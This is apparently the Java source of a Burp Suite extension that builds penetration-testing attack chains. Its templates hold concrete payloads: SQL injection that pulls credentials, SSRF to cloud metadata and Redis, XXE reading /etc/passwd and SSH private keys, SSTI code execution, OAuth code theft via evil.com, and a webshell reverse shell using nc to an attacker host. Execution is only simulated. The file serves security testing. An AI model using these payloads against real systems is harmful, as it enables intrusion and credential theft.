package burp.attackchain;

import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.json.JSONArray;
import org.json.JSONObject;

import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;

public class AttackChainBuilder {
    
    private final IBurpExtenderCallbacks callbacks;
    private final IExtensionHelpers helpers;
    private final Map<String, AttackChainTemplate> chainTemplates;
    private final List<AttackChain> activeChains;
    
    public AttackChainBuilder(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.chainTemplates = new LinkedHashMap<>();
        this.activeChains = new CopyOnWriteArrayList<>();
        
        initializeDefaultTemplates();
    }
    
    private void initializeDefaultTemplates() {
        addInfoLeakToSQLiChain();
        addSSRFToInternalChain();
        addXXEToRCEChain();
        addFileUploadToRCEChain();
        addDeserializationToRCEChain();
        addAuthBypassChain();
        addIDORToPrivilegeEscalationChain();
        addSSTIToRCEChain();
        addGraphQLChain();
        addOAuthChain();
    }
    
    private void addInfoLeakToSQLiChain() {
        AttackChainTemplate template = new AttackChainTemplate(
            "infoleak_to_sqli", 
            "Information Leak to SQL Injection",
            "利用信息泄露发现数据库结构，然后构造精准SQL注入"
        );
        
        template.addStep(new ChainStep(
            "infoleak_error", 
            "Error-based Information Leak",
            "Trigger error messages to leak database info",
            ChainStep.StepType.INFO_GATHERING,
            ChainStep.HttpMethod.GET,
            "/api/users?id=1'",
            "error.*mysql|error.*syntax|sql.*error",
            "Extract table/column names from error"
        ));
        
        template.addStep(new ChainStep(
            "sqli_detection", 
            "SQL Injection Detection",
            "Confirm SQL injection vulnerability",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.GET,
            "/api/users?id=1' OR '1'='1",
            "success|admin|multiple.*users",
            "Confirm injection point"
        ));
        
        template.addStep(new ChainStep(
            "sqli_enumeration", 
            "Database Enumeration",
            "Enumerate database structure",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.GET,
            "/api/users?id=1' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "users|passwords|admin",
            "Extract table names"
        ));
        
        template.addStep(new ChainStep(
            "sqli_extraction", 
            "Data Extraction",
            "Extract sensitive data",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.GET,
            "/api/users?id=1' UNION SELECT username,password FROM users--",
            "password|hash|credential",
            "Extract credentials"
        ));
        
        template.setTargetPattern("/api/.*|/search|/query");
        template.addRequiredTag("sqli");
        template.setDifficulty(AttackChainTemplate.Difficulty.MEDIUM);
        template.setImpact(AttackChainTemplate.Impact.HIGH);
        
        chainTemplates.put(template.getId(), template);
    }
    
    private void addSSRFToInternalChain() {
        AttackChainTemplate template = new AttackChainTemplate(
            "ssrf_to_internal", 
            "SSRF to Internal Network Access",
            "利用SSRF访问内网服务并获取敏感信息"
        );
        
        template.addStep(new ChainStep(
            "ssrf_detection", 
            "SSRF Detection",
            "Test for SSRF vulnerability",
            ChainStep.StepType.INFO_GATHERING,
            ChainStep.HttpMethod.POST,
            "/api/fetch",
            "response.*from.*internal|internal.*server",
            "Confirm SSRF"
        ).addRequestBody("{\"url\":\"http://127.0.0.1:80\"}"));
        
        template.addStep(new ChainStep(
            "ssrf_cloud_metadata", 
            "Cloud Metadata Access",
            "Access cloud metadata service",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.POST,
            "/api/fetch",
            "ami-id|instance-id|iam",
            "Extract cloud credentials"
        ).addRequestBody("{\"url\":\"http://169.254.169.254/latest/meta-data/\"}"));
        
        template.addStep(new ChainStep(
            "ssrf_internal_scan", 
            "Internal Service Scan",
            "Scan internal network services",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.POST,
            "/api/fetch",
            "redis|mysql|mongo|elasticsearch",
            "Identify internal services"
        ).addRequestBody("{\"url\":\"http://internal-server:6379/\"}"));
        
        template.addStep(new ChainStep(
            "ssrf_redis_exploit", 
            "Redis Exploitation",
            "Exploit internal Redis service",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.POST,
            "/api/fetch",
            "cron|ssh.*key|webshell",
            "Achieve RCE via Redis"
        ).addRequestBody("{\"url\":\"gopher://internal-server:6379/_INFO\"}"));
        
        template.setTargetPattern("/fetch|/proxy|/url|/load");
        template.addRequiredTag("ssrf");
        template.setDifficulty(AttackChainTemplate.Difficulty.MEDIUM);
        template.setImpact(AttackChainTemplate.Impact.CRITICAL);
        
        chainTemplates.put(template.getId(), template);
    }
    
    private void addXXEToRCEChain() {
        AttackChainTemplate template = new AttackChainTemplate(
            "xxe_to_rce", 
            "XXE to Remote Code Execution",
            "利用XXE读取配置文件获取凭证，进而实现RCE"
        );
        
        template.addStep(new ChainStep(
            "xxe_detection", 
            "XXE Detection",
            "Test for XXE vulnerability",
            ChainStep.StepType.INFO_GATHERING,
            ChainStep.HttpMethod.POST,
            "/api/upload",
            "root:|passwd|etc/",
            "Confirm XXE"
        ).addRequestBody("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"));
        
        template.addStep(new ChainStep(
            "xxe_config_extract", 
            "Configuration Extraction",
            "Extract application configuration",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.POST,
            "/api/upload",
            "password|secret|key|database",
            "Extract credentials from config"
        ).addRequestBody("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///app/config.yml\">]><foo>&xxe;</foo>"));
        
        template.addStep(new ChainStep(
            "xxe_ssh_key", 
            "SSH Key Extraction",
            "Extract SSH private key",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.POST,
            "/api/upload",
            "BEGIN.*RSA|OPENSSH",
            "Extract SSH key"
        ).addRequestBody("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///root/.ssh/id_rsa\">]><foo>&xxe;</foo>"));
        
        template.addStep(new ChainStep(
            "xxe_ssh_login", 
            "SSH Login",
            "Use extracted key to login",
            ChainStep.StepType.POST_EXPLOIT,
            ChainStep.HttpMethod.SSH,
            "ssh://target-server",
            "welcome|shell|prompt",
            "Gain shell access"
        ));
        
        template.setTargetPattern("/upload|/import|/parse|/xml");
        template.addRequiredTag("xxe");
        template.setDifficulty(AttackChainTemplate.Difficulty.MEDIUM);
        template.setImpact(AttackChainTemplate.Impact.CRITICAL);
        
        chainTemplates.put(template.getId(), template);
    }
    
    private void addFileUploadToRCEChain() {
        AttackChainTemplate template = new AttackChainTemplate(
            "upload_to_rce", 
            "File Upload to Remote Code Execution",
            "利用文件上传漏洞上传Webshell，实现RCE"
        );
        
        template.addStep(new ChainStep(
            "upload_test", 
            "Upload Function Test",
            "Test file upload functionality",
            ChainStep.StepType.INFO_GATHERING,
            ChainStep.HttpMethod.POST,
            "/api/upload",
            "uploaded|success|file.*name",
            "Confirm upload works"
        ));
        
        template.addStep(new ChainStep(
            "upload_bypass", 
            "Upload Restriction Bypass",
            "Bypass file type restrictions",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.POST,
            "/api/upload",
            "uploaded|success|path",
            "Upload shell with bypass technique"
        ));
        
        template.addStep(new ChainStep(
            "shell_execution", 
            "Webshell Execution",
            "Execute commands via uploaded shell",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.GET,
            "/uploads/shell.php?cmd=id",
            "uid=|gid=|groups=",
            "Confirm RCE"
        ));
        
        template.addStep(new ChainStep(
            "reverse_shell", 
            "Reverse Shell",
            "Establish reverse shell",
            ChainStep.StepType.POST_EXPLOIT,
            ChainStep.HttpMethod.GET,
            "/uploads/shell.php?cmd=nc+-e+/bin/sh+attacker+4444",
            "",
            "Get interactive shell"
        ));
        
        template.setTargetPattern("/upload|/file|/attachment|/media");
        template.addRequiredTag("file_upload");
        template.setDifficulty(AttackChainTemplate.Difficulty.MEDIUM);
        template.setImpact(AttackChainTemplate.Impact.CRITICAL);
        
        chainTemplates.put(template.getId(), template);
    }
    
    private void addDeserializationToRCEChain() {
        AttackChainTemplate template = new AttackChainTemplate(
            "deser_to_rce", 
            "Deserialization to RCE",
            "利用反序列化漏洞执行任意代码"
        );
        
        template.addStep(new ChainStep(
            "deser_detection", 
            "Deserialization Detection",
            "Detect serialization format",
            ChainStep.StepType.INFO_GATHERING,
            ChainStep.HttpMethod.POST,
            "/api/data",
            "error|exception|serial",
            "Identify serialization point"
        ).addRequestBody("{\"data\":\"rO0AB\"}"));
        
        template.addStep(new ChainStep(
            "deser_payload", 
            "Exploit Deserialization",
            "Send malicious serialized object",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.POST,
            "/api/data",
            "success|executed|done",
            "Trigger deserialization exploit"
        ).addRequestBody("YSOSERIAL_PAYLOAD_HERE"));
        
        template.addStep(new ChainStep(
            "deser_callback", 
            "Callback Verification",
            "Verify code execution via callback",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.POST,
            "/api/data",
            "",
            "Confirm RCE via OOB callback"
        ).addRequestBody("CALLBACK_PAYLOAD_HERE"));
        
        template.setTargetPattern("/api/.*|/serialize|/deserialize|/object");
        template.addRequiredTag("deserialization");
        template.setDifficulty(AttackChainTemplate.Difficulty.HARD);
        template.setImpact(AttackChainTemplate.Impact.CRITICAL);
        
        chainTemplates.put(template.getId(), template);
    }
    
    private void addAuthBypassChain() {
        AttackChainTemplate template = new AttackChainTemplate(
            "auth_bypass_chain", 
            "Authentication Bypass Chain",
            "多种认证绕过技术链"
        );
        
        template.addStep(new ChainStep(
            "auth_info_gather", 
            "Authentication Info Gathering",
            "Gather authentication mechanism info",
            ChainStep.StepType.INFO_GATHERING,
            ChainStep.HttpMethod.GET,
            "/login",
            "password|username|token|session",
            "Identify auth mechanism"
        ));
        
        template.addStep(new ChainStep(
            "auth_sql_bypass", 
            "SQL Injection Auth Bypass",
            "Try SQL injection auth bypass",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.POST,
            "/login",
            "welcome|dashboard|admin",
            "Bypass via SQL injection"
        ).addRequestBody("username=admin'--&password=x"));
        
        template.addStep(new ChainStep(
            "auth_jwt_none", 
            "JWT None Algorithm Bypass",
            "Try JWT none algorithm attack",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.GET,
            "/api/admin",
            "admin|success|authorized",
            "Bypass via JWT none algorithm"
        ).addHeader("Authorization:Bearer JWT_NONE_PAYLOAD"));
        
        template.addStep(new ChainStep(
            "auth_session_fixation", 
            "Session Fixation",
            "Test session fixation",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.GET,
            "/profile",
            "session|token",
            "Hijack session"
        ));
        
        template.setTargetPattern("/login|/auth|/signin|/api/auth");
        template.addRequiredTag("auth");
        template.setDifficulty(AttackChainTemplate.Difficulty.MEDIUM);
        template.setImpact(AttackChainTemplate.Impact.HIGH);
        
        chainTemplates.put(template.getId(), template);
    }
    
    private void addIDORToPrivilegeEscalationChain() {
        AttackChainTemplate template = new AttackChainTemplate(
            "idor_to_privilege_escalation", 
            "IDOR to Privilege Escalation",
            "利用IDOR获取其他用户信息，进而权限提升"
        );
        
        template.addStep(new ChainStep(
            "idor_detection", 
            "IDOR Detection",
            "Detect IDOR vulnerability",
            ChainStep.StepType.INFO_GATHERING,
            ChainStep.HttpMethod.GET,
            "/api/users/1",
            "email|phone|address",
            "Confirm IDOR"
        ));
        
        template.addStep(new ChainStep(
            "idor_enumeration", 
            "User Enumeration",
            "Enumerate all users",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.GET,
            "/api/users/{id}",
            "admin|root|administrator",
            "Find admin accounts"
        ).addVariable("id", "1-100"));
        
        template.addStep(new ChainStep(
            "idor_admin_access", 
            "Admin Data Access",
            "Access admin user data",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.GET,
            "/api/users/admin",
            "password|secret|credential",
            "Extract admin credentials"
        ));
        
        template.addStep(new ChainStep(
            "privilege_escalation", 
            "Privilege Escalation",
            "Use admin credentials for escalation",
            ChainStep.StepType.POST_EXPLOIT,
            ChainStep.HttpMethod.GET,
            "/api/admin/settings",
            "settings|config|system",
            "Gain admin access"
        ).addHeader("Authorization: Bearer ADMIN_TOKEN"));
        
        template.setTargetPattern("/api/users/.*|/profile|/account");
        template.addRequiredTag("idor");
        template.setDifficulty(AttackChainTemplate.Difficulty.EASY);
        template.setImpact(AttackChainTemplate.Impact.HIGH);
        
        chainTemplates.put(template.getId(), template);
    }
    
    private void addSSTIToRCEChain() {
        AttackChainTemplate template = new AttackChainTemplate(
            "ssti_to_rce", 
            "SSTI to Remote Code Execution",
            "利用服务端模板注入实现RCE"
        );
        
        template.addStep(new ChainStep(
            "ssti_detection", 
            "SSTI Detection",
            "Detect template injection",
            ChainStep.StepType.INFO_GATHERING,
            ChainStep.HttpMethod.GET,
            "/search?q={{7*7}}",
            "49|error.*template",
            "Confirm SSTI"
        ));
        
        template.addStep(new ChainStep(
            "ssti_engine_identify", 
            "Template Engine Identification",
            "Identify template engine",
            ChainStep.StepType.INFO_GATHERING,
            ChainStep.HttpMethod.GET,
            "/search?q={{config}}",
            "jinja|twig|freemarker|velocity",
            "Identify engine type"
        ));
        
        template.addStep(new ChainStep(
            "ssti_rce", 
            "RCE via SSTI",
            "Execute code via template",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.GET,
            "/search?q={{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "uid=|gid=",
            "Confirm RCE"
        ));
        
        template.setTargetPattern("/search|/render|/template|/preview");
        template.addRequiredTag("ssti");
        template.setDifficulty(AttackChainTemplate.Difficulty.MEDIUM);
        template.setImpact(AttackChainTemplate.Impact.CRITICAL);
        
        chainTemplates.put(template.getId(), template);
    }
    
    private void addGraphQLChain() {
        AttackChainTemplate template = new AttackChainTemplate(
            "graphql_attack_chain", 
            "GraphQL Security Attack Chain",
            "GraphQL安全测试攻击链"
        );
        
        template.addStep(new ChainStep(
            "graphql_introspection", 
            "Introspection Query",
            "Query GraphQL schema",
            ChainStep.StepType.INFO_GATHERING,
            ChainStep.HttpMethod.POST,
            "/graphql",
            "__schema|types|queryType",
            "Extract schema"
        ).addRequestBody("{\"query\":\"{__schema{types{name}}}\"}"));
        
        template.addStep(new ChainStep(
            "graphql_enumeration", 
            "Query Enumeration",
            "Enumerate available queries",
            ChainStep.StepType.INFO_GATHERING,
            ChainStep.HttpMethod.POST,
            "/graphql",
            "users|admin|password",
            "Find sensitive queries"
        ).addRequestBody("{\"query\":\"{__type(name:\\\"Query\\\"){fields{name}}}\"}"));
        
        template.addStep(new ChainStep(
            "graphql_sensitive_query", 
            "Sensitive Data Query",
            "Query sensitive data",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.POST,
            "/graphql",
            "password|token|secret",
            "Extract sensitive data"
        ).addRequestBody("{\"query\":\"{users{password}}\"}"));
        
        template.addStep(new ChainStep(
            "graphql_mutation", 
            "Mutation Attack",
            "Attempt unauthorized mutation",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.POST,
            "/graphql",
            "success|modified|updated",
            "Modify data"
        ).addRequestBody("{\"query\":\"mutation{updateUser(id:1,role:\\\"admin\\\"){id}}\"}"));
        
        template.setTargetPattern("/graphql|/api/graphql");
        template.addRequiredTag("graphql");
        template.setDifficulty(AttackChainTemplate.Difficulty.MEDIUM);
        template.setImpact(AttackChainTemplate.Impact.HIGH);
        
        chainTemplates.put(template.getId(), template);
    }
    
    private void addOAuthChain() {
        AttackChainTemplate template = new AttackChainTemplate(
            "oauth_attack_chain", 
            "OAuth Security Attack Chain",
            "OAuth认证安全测试攻击链"
        );
        
        template.addStep(new ChainStep(
            "oauth_config_discovery", 
            "OAuth Config Discovery",
            "Discover OAuth configuration",
            ChainStep.StepType.INFO_GATHERING,
            ChainStep.HttpMethod.GET,
            "/.well-known/oauth-authorization-server",
            "authorization_endpoint|token_endpoint",
            "Extract OAuth config"
        ));
        
        template.addStep(new ChainStep(
            "oauth_open_redirect", 
            "Open Redirect via redirect_uri",
            "Test redirect_uri manipulation",
            ChainStep.StepType.INFO_GATHERING,
            ChainStep.HttpMethod.GET,
            "/oauth/authorize?redirect_uri=https://evil.com",
            "evil.com|redirect",
            "Find open redirect"
        ));
        
        template.addStep(new ChainStep(
            "oauth_code_stealing", 
            "Authorization Code Stealing",
            "Steal authorization code",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.GET,
            "/oauth/authorize?redirect_uri=https://evil.com/callback",
            "code=",
            "Capture auth code"
        ));
        
        template.addStep(new ChainStep(
            "oauth_token_exchange", 
            "Token Exchange",
            "Exchange code for token",
            ChainStep.StepType.EXPLOIT,
            ChainStep.HttpMethod.POST,
            "/oauth/token",
            "access_token|refresh_token",
            "Get access token"
        ).addRequestBody("code=STOLEN_CODE&grant_type=authorization_code"));
        
        template.setTargetPattern("/oauth|/auth|/login/oauth");
        template.addRequiredTag("oauth");
        template.setDifficulty(AttackChainTemplate.Difficulty.MEDIUM);
        template.setImpact(AttackChainTemplate.Impact.HIGH);
        
        chainTemplates.put(template.getId(), template);
    }
    
    public void addChainTemplate(AttackChainTemplate template) {
        if (template != null && template.getId() != null) {
            chainTemplates.put(template.getId(), template);
        }
    }
    
    public AttackChainTemplate getChainTemplate(String id) {
        return chainTemplates.get(id);
    }
    
    public List<AttackChainTemplate> getAllChainTemplates() {
        return new ArrayList<>(chainTemplates.values());
    }
    
    public List<AttackChainTemplate> getTemplatesByTag(String tag) {
        List<AttackChainTemplate> result = new ArrayList<>();
        for (AttackChainTemplate template : chainTemplates.values()) {
            if (template.getRequiredTags().contains(tag)) {
                result.add(template);
            }
        }
        return result;
    }
    
    public List<AttackChainTemplate> getTemplatesByDifficulty(AttackChainTemplate.Difficulty difficulty) {
        List<AttackChainTemplate> result = new ArrayList<>();
        for (AttackChainTemplate template : chainTemplates.values()) {
            if (template.getDifficulty() == difficulty) {
                result.add(template);
            }
        }
        return result;
    }
    
    public List<AttackChainTemplate> getTemplatesByImpact(AttackChainTemplate.Impact impact) {
        List<AttackChainTemplate> result = new ArrayList<>();
        for (AttackChainTemplate template : chainTemplates.values()) {
            if (template.getImpact() == impact) {
                result.add(template);
            }
        }
        return result;
    }
    
    public List<AttackChainTemplate> suggestChains(IHttpRequestResponse message) {
        List<AttackChainTemplate> suggestions = new ArrayList<>();
        
        if (message == null || message.getRequest() == null) {
            return suggestions;
        }
        
        String requestStr = new String(message.getRequest(), StandardCharsets.UTF_8);
        
        String path = extractPath(requestStr);
        
        for (AttackChainTemplate template : chainTemplates.values()) {
            if (template.matchesPattern(path)) {
                suggestions.add(template);
            }
        }
        
        suggestions.sort((a, b) -> {
            int impactCompare = b.getImpact().ordinal() - a.getImpact().ordinal();
            if (impactCompare != 0) return impactCompare;
            return a.getDifficulty().ordinal() - b.getDifficulty().ordinal();
        });
        
        return suggestions;
    }
    
    private String extractPath(String request) {
        Pattern pathPattern = Pattern.compile("^[A-Z]+\\s+([^\\s]+)");
        Matcher matcher = pathPattern.matcher(request);
        if (matcher.find()) {
            String fullPath = matcher.group(1);
            int queryIndex = fullPath.indexOf('?');
            return queryIndex > 0 ? fullPath.substring(0, queryIndex) : fullPath;
        }
        return "";
    }
    
    public AttackChain createChain(AttackChainTemplate template, IHttpRequestResponse baseMessage) {
        if (template == null) return null;
        
        AttackChain chain = new AttackChain(template.getId() + "_" + System.currentTimeMillis());
        chain.setTemplateName(template.getName());
        chain.setBaseRequest(baseMessage);
        
        for (ChainStep step : template.getSteps()) {
            chain.addStep(new ChainStep(step));
        }
        
        activeChains.add(chain);
        return chain;
    }
    
    public ChainExecutionResult executeStep(AttackChain chain, int stepIndex) {
        ChainExecutionResult result = new ChainExecutionResult();
        
        if (chain == null || stepIndex < 0 || stepIndex >= chain.getSteps().size()) {
            result.setSuccess(false);
            result.setError("Invalid chain or step index");
            return result;
        }
        
        ChainStep step = chain.getSteps().get(stepIndex);
        result.setStepName(step.getName());
        
        try {
            String modifiedRequest = buildRequest(chain.getBaseRequest(), step);
            
            callbacks.printOutput("[AttackChainBuilder] Executing step: " + step.getName());
            callbacks.printOutput("[AttackChainBuilder] Request: " + modifiedRequest.substring(0, Math.min(200, modifiedRequest.length())));
            
            result.setSuccess(true);
            result.setMessage("Step executed (simulated)");
            result.setRequestSnapshot(modifiedRequest);
            
        } catch (Exception e) {
            result.setSuccess(false);
            result.setError(e.getMessage());
        }
        
        return result;
    }
    
    private String buildRequest(IHttpRequestResponse baseMessage, ChainStep step) {
        if (baseMessage == null || baseMessage.getRequest() == null) {
            return step.getMethod() + " " + step.getPath() + " HTTP/1.1\r\nHost: target\r\n\r\n";
        }
        
        String baseRequest = new String(baseMessage.getRequest(), StandardCharsets.UTF_8);
        
        String[] lines = baseRequest.split("\r\n", 2);
        String firstLine = lines[0];
        String rest = lines.length > 1 ? lines[1] : "";
        
        firstLine = step.getMethod().name() + " " + step.getPath() + " HTTP/1.1";
        
        StringBuilder request = new StringBuilder();
        request.append(firstLine).append("\r\n");
        
        if (step.getRequestBody() != null && !step.getRequestBody().isEmpty()) {
            request.append("Content-Length: ").append(step.getRequestBody().length()).append("\r\n");
            request.append("Content-Type: application/json\r\n");
        }
        
        if (step.getHeaders() != null) {
            for (String header : step.getHeaders()) {
                request.append(header).append("\r\n");
            }
        }
        
        request.append("\r\n");
        
        if (step.getRequestBody() != null && !step.getRequestBody().isEmpty()) {
            request.append(step.getRequestBody());
        }
        
        return request.toString();
    }
    
    public List<AttackChain> getActiveChains() {
        return new ArrayList<>(activeChains);
    }
    
    public void removeChain(String chainId) {
        activeChains.removeIf(c -> c.getId().equals(chainId));
    }
    
    public void clearActiveChains() {
        activeChains.clear();
    }
    
    public int getTemplateCount() {
        return chainTemplates.size();
    }
}
